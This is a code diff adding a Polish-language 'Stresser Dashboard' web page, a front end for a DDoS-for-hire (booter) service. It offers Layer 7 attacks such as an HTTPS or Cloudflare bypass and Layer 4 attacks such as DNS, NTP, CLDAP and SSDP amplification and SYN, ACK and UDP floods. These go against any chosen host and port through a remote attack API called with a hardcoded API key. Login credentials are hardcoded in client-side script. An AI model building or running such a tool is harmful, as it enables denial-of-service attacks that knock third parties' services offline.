@@ -1,0 +1,264 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stresser Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-900 text-white min-h-screen flex flex-col items-center justify-center p-4">
+    <div id="loginPanel" class="w-full max-w-md">
+        <h1 class="text-3xl font-bold text-center text-blue-400 mb-6">Logowanie</h1>
+        <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
+            <div class="mb-4">
+                <label for="username" class="block text-sm font-medium text-gray-300">Nazwa użytkownika</label>
+                <input type="text" id="username" class="mt-1 w-full p-2 bg-gray-700 border border-gray-600 rounded-md text-white focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+            </div>
+            <div class="mb-4">
+                <label for="password" class="block text-sm font-medium text-gray-300">Hasło</label>
+                <input type="password" id="password" class="mt-1 w-full p-2 bg-gray-700 border border-gray-600 rounded-md text-white focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+            </div>
+            <button onclick="handleLogin()" class="w-full p-2 bg-blue-600 hover:bg-blue-700 rounded-md text-white font-semibold">Zaloguj</button>
+            <p id="errorMessage" class="mt-4 text-center text-red-500 hidden"></p>
+        </div>
+    </div>
+    <div id="mainPanel" class="hidden w-full max-w-md">
+        <h1 class="text-3xl font-bold text-center text-blue-400 mb-6">Stresser Dashboard</h1>
+        <div class="flex justify-center mb-4">
+            <button id="tab-layer7" class="px-4 py-2 bg-blue-600 text-white rounded-t-md font-semibold">Layer 7</button>
+            <button id="tab-layer4" class="px-4 py-2 bg-gray-700 text-white rounded-t-md font-semibold">Layer 4</button>
+        </div>
+        <div id="layer7" class="bg-gray-800 p-6 rounded-b-lg rounded-r-lg shadow-lg">
+            <div class="mb-4">
+                <label for="hostL7" class="block text-sm font-medium text-gray-300">Host (URL lub IP)</label>
+                <input type="text" id="hostL7" placeholder="np. example.com lub 192.168.1.1" class="mt-1 w-full p-2 bg-gray-700 border border-gray-600 rounded-md text-white focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+            </div>
+            <div class="mb-4">
+                <label for="portL7" class="block text-sm font-medium text-gray-300">Port</label>
+                <input type="number" id="portL7" placeholder="np. 80" min="1" max="65535" class="mt-1 w-full p-2 bg-gray-700 border border-gray-600 rounded-md text-white focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+            </div>
+            <div class="mb-4">
+                <label for="timeL7" class="block text-sm font-medium text-gray-300">Czas (1-200 sekund)</label>
+                <input type="number" id="timeL7" min="1" max="200" value="60" class="mt-1 w-full p-2 bg-gray-700 border border-gray-600 rounded-md text-white focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+            </div>
+            <div class="mb-4">
+                <label for="concsL7" class="block text-sm font-medium text-gray-300">Połączenia równoległe (1-4)</label>
+                <input type="number" id="concsL7" min="1" max="4" value="1" class="mt-1 w-full p-2 bg-gray-700 border border-gray-600 rounded-md text-white focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+            </div>
+            <div class="mb-4">
+                <label for="methodL7" class="block text-sm font-medium text-gray-300">Metoda</label>
+                <select id="methodL7" class="mt-1 w-full p-2 bg-gray-700 border border-gray-600 rounded-md text-white focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+                    <option value="httpsbypass">L7 | HTTPS Bypass</option>
+                    <option value="cloudflare">L7 | Cloudflare</option>
+                    <option value="browser">L7 | Browser</option>
+                    <option value="priv-flood">L7 | Private Flood</option>
+                </select>
+            </div>
+            <button onclick="launchTest('L7')" class="w-full p-2 bg-blue-600 hover:bg-blue-700 rounded-md text-white font-semibold">Rozpocznij test</button>
+        </div>
+        <div id="layer4" class="hidden bg-gray-800 p-6 rounded-b-lg rounded-r-lg shadow-lg">
+            <div class="mb-4">
+                <label for="hostL4" class="block text-sm font-medium text-gray-300">Host (URL lub IP)</label>
+                <input type="text" id="hostL4" placeholder="np. example.com lub 192.168.1.1" class="mt-1 w-full p-2 bg-gray-700 border border-gray-600 rounded-md text-white focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+            </div>
+            <div class="mb-4">
+                <label for="portL4" class="block text-sm font-medium text-gray-300">Port</label>
+                <input type="number" id="portL4" placeholder="np. 80" min="1" max="65535" class="mt-1 w-full p-2 bg-gray-700 border border-gray-600 rounded-md text-white focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+            </div>
+            <div class="mb-4">
+                <label for="timeL4" class="block text-sm font-medium text-gray-300">Czas (1-200 sekund)</label>
+                <input type="number" id="timeL4" min="1" max="200" value="60" class="mt-1 w-full p-2 bg-gray-700 border border-gray-600 rounded-md text-white focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+            </div>
+            <div class="mb-4">
+                <label for="concsL4" class="block text-sm font-medium text-gray-300">Połączenia równoległe (1-4)</label>
+                <input type="number" id="concsL4" min="1" max="4" value="1" class="mt-1 w-full p-2 bg-gray-700 border border-gray-600 rounded-md text-white focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+            </div>
+            <div class="mb-4">
+                <label for="methodL4" class="block text-sm font-medium text-gray-300">Metoda</label>
+                <select id="methodL4" class="mt-1 w-full p-2 bg-gray-700 border border-gray-600 rounded-md text-white focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+                    <option value="dnsamp">DNS Amplification</option>
+                    <option value="ntpd">NTP Amplification</option>
+                    <option value="cldap">CLDAP Amplification</option>
+                    <option value="wsdd">Web Services Discovery Amplification</option>
+                    <option value="ssdp">SSDP Amplification</option>
+                    <option value="stun">STUN Amplification</option>
+                    <option value="ard">Apple Remote Desktop Amplification</option>
+                    <option value="mixamp">Mixed Amplification</option>
+                    <option value="udpflood">UDP Flood</option>
+                    <option value="udppulse">UDP With High PPS</option>
+                    <option value="udpbyass">UDP Based Method</option>
+                    <option value="gamemix">Game-Mix</option>
+                    <option value="synbypass">TCP SYN Flood</option>
+                    <option value="ackbypass">TCP ACK Flood</option>
+                    <option value="tcpcookie">TCP Cookie Flood</option>
+                    <option value="ovhudp">3-Way RAW Handshake</option>
+                    <option value="openvpn">Flooding OpenVPN Servers</option>
+                    <option value="raknet">RakeNet Query Flood</option>
+                    <option value="discord">Optimized Discord Method</option>
+                    <option value="tsn">TeamSpeak Query Authentication Flood</option>
+                    <option value="icmp">FiveM Echo Request Packets</option>
+                </select>
+            </div>
+            <button onclick="launchTest('L4')" class="w-full p-2 bg-blue-600 hover:bg-blue-700 rounded-md text-white font-semibold">Rozpocznij test</button>
+        </div>
+    </div>
+    <script>
+        const API_KEY = "56e51751a9323b9e353025897871096abfe66c8e1dd9444bb0a5cca9138c379a";
+        const API_URL = "https://api.santastress.ru/api/start";
+        const USERS = [["test", "test"], ["admin", "testadmin"]];
+
+        function displayMessage(msg, success = false) {
+            const msgElement = document.getElementById("errorMessage");
+            if (msgElement) {
+                msgElement.textContent = msg;
+                msgElement.classList.remove("hidden", "text-red-500", "text-green-500");
+                msgElement.classList.add(success ? "text-green-500" : "text-red-500");
+                msgElement.classList.remove("hidden");
+                console.log(msg);
+            }
+        }
+
+        function handleLogin() {
+            const user = document.getElementById("username")?.value.trim();
+            const pass = document.getElementById("password")?.value.trim();
+            if (!user || !pass) {
+                displayMessage("Wypełnij wszystkie pola!");
+                return;
+            }
+            const isValid = USERS.some(([u, p]) => u === user && p === pass);
+            if (isValid) {
+                document.getElementById("loginPanel")?.classList.add("hidden");
+                document.getElementById("mainPanel")?.classList.remove("hidden");
+                displayMessage("Zalogowano pomyślnie!", true);
+                setTimeout(() => {
+                    document.getElementById("errorMessage")?.classList.add("hidden");
+                }, 2000);
+            } else {
+                displayMessage("Błędna nazwa użytkownika lub hasło!");
+            }
+        }
+
+        function switchTab(tab) {
+            const tabs = ["layer7", "layer4"];
+            tabs.forEach(t => {
+                const tabBtn = document.getElementById(`tab-${t}`);
+                const tabContent = document.getElementById(t);
+                if (tabBtn && tabContent) {
+                    tabBtn.classList.toggle("bg-blue-600", t === tab);
+                    tabBtn.classList.toggle("bg-gray-700", t !== tab);
+                    tabContent.classList.toggle("hidden", t !== tab);
+                }
+            });
+        }
+
+        function validateForm(host, port, time, concs, method) {
+            if (!host || isNaN(port) || port < 1 || port > 65535 || isNaN(time) || time < 1 || time > 200 || isNaN(concs) || concs < 1 || concs > 4 || !method) {
+                displayMessage("Wypełnij poprawnie wszystkie pola!");
+                return false;
+            }
+            return true;
+        }
+
+        function launchTest(layer) {
+            if (!API_KEY || API_KEY.length !== 64) {
+                displayMessage("Błędny klucz API!");
+                return;
+            }
+            
+            const host = document.getElementById(`host${layer}`)?.value.trim();
+            const port = parseInt(document.getElementById(`port${layer}`)?.value);
+            const time = parseInt(document.getElementById(`time${layer}`)?.value);
+            const method = document.getElementById(`method${layer}`)?.value;
+            const concs = parseInt(document.getElementById(`concs${layer}`)?.value);
+            
+            if (!validateForm(host, port, time, concs, method)) return;
+            
+            // Budowanie URL z parametrami GET
+            const params = new URLSearchParams();
+            params.append('key', API_KEY);
+            params.append('host', host);
+            params.append('port', port);
+            params.append('time', time);
+            params.append('method', method);
+            params.append('concs', concs);
+            
+            const url = `${API_URL}?${params.toString()}`;
+            console.log("Wysyłanie zapytania GET do:", url);
+            
+            // Wysyłanie żądania GET
+            fetch(url)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`Błąd HTTP: ${response.status}`);
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log("Odpowiedź z API:", data);
+                    displayMessage("Test rozpoczęty pomyślnie!", true);
+                    setTimeout(() => {
+                        document.getElementById("errorMessage")?.classList.add("hidden");
+                    }, 2000);
+                })
+                .catch(error => {
+                    console.error("Błąd podczas wysyłania żądania:", error);
+                    displayMessage(`Błąd: ${error.message}`);
+                });
+        }
+
+        // Inicjalizacja event listenerów
+        document.addEventListener("DOMContentLoaded", () => {
+            document.getElementById("tab-layer7")?.addEventListener("click", () => switchTab("layer7"));
+            document.getElementById("tab-layer4")?.addEventListener("click", () => switchTab("layer4"));
+            
+            // Dodanie obsługi klawisza Enter w formularzu logowania
+            document.getElementById("password")?.addEventListener("keypress", (e) => {
+                if (e.key === "Enter") {
+                    handleLogin();
+                }
+            });
+            
+            console.log("Skrypt został załadowany");
+        });
+    </script>
+</body>
+</html>
